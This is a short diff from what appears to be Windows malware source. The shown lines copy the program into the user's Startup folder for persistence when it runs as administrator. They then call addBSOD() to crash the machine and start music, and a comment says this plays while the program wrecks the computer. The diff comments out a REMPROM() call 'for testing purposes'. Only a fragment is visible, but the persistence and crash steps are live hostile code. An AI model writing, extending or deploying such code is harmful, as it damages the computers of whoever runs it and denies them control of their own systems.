@@ -63,7 +63,7 @@ if is_admin():
         startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
         shutil.copy(file_path, startup_folder)
 
-    REMPROM()
+    #   REMPROM() function removal for testing purposes (and wont work in future updates)
     addBSOD()
 
     StartProcess(path) # This will make the music start while the program is fucking the computer
